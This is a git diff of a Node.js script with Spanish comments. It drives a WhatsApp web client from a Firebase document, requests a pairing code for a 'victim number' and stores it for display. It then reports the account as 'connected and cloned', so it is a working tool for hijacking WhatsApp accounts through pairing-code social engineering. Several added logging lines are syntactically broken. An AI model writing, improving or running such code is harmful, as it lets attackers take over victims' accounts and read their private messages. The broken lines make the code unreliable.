@@ -3,7 +3,9 @@ const admin = require('firebase-admin');
 const http = require('http');
 
 const serviceAccount = require("./serviceAccountKey.json"); 
-if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
+if (!admin.apps.length) { 
+    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); 
+}
 const db = admin.firestore();
 
 const client = new Client({
@@ -14,38 +16,40 @@ const client = new Client({
     }
 });
 
-// FUNCIÓN PARA PROCESAR EL NUMERO
-async function procesarNumero(docSnap) {
-    const data = docSnap.data();
-    if (data && data.status === "solicitando_codigo" && data.numero_victima) {
-        console.log("Detectado número para vincular:", data.numero_victima);
+// Función para procesar y generar el código
+async function generarCodigo(snap) {
+    const data = snap.data();
+    if (data && data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
+        console.log([!] Solicitando código para: ${data.numero_victima});
         try {
+            // Importante: No pedir código si el cliente no está inicializado
             const code = await client.requestPairingCode(data.numero_victima);
-            await docSnap.ref.update({ 
-                pairingCode: code, 
-                status: "mostrando_codigo" 
+            console.log([OK] CÓDIGO GENERADO: ${code});
+            await snap.ref.update({
+                pairingCode: code,
+                status: "mostrando_codigo"
             });
-            console.log("¡CÓDIGO GENERADO Y ENVIADO!: ", code);
-        } catch (e) {
-            console.error("Error al generar código:", e.message);
+        } catch (err) {
+            console.error("[ERROR] Fallo al generar código:", err.message);
+            // Si falla, reseteamos el status para poder reintentar
+            await snap.ref.update({ status: "error", error: err.message });
         }
     }
 }
 
-// ESCUCHA AUTOMÁTICA + POLLING (Doble seguridad)
-db.collection("wa_clon_global").doc("current_session").onSnapshot(procesarNumero);
-
-// Revisión manual cada 10 segundos por si el Snapshot falla
-setInterval(async () => {
-    const doc = await db.collection("wa_clon_global").doc("current_session").get();
-    if(doc.exists) procesarNumero(doc);
-}, 10000);
+// Escuchamos el documento de Firebase
+db.collection("wa_clon_global").doc("current_session").onSnapshot(generarCodigo);
 
 client.on('ready', () => {
-    console.log("SESIÓN TOTALMENTE ACTIVA");
+    console.log("[!] WHATSAPP CONECTADO Y CLONADO");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize().catch(err => console.log("Fallo al inicializar:", err));
+// Inicializamos el cliente
+client.initialize();
 
-http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(process.env.PORT || 3000);
+// Servidor de respuesta para Render
+http.createServer((req, res) => {
+    res.write('MOTOR WA PAIRING ONLINE');
+    res.end();
+}).listen(process.env.PORT || 3000);
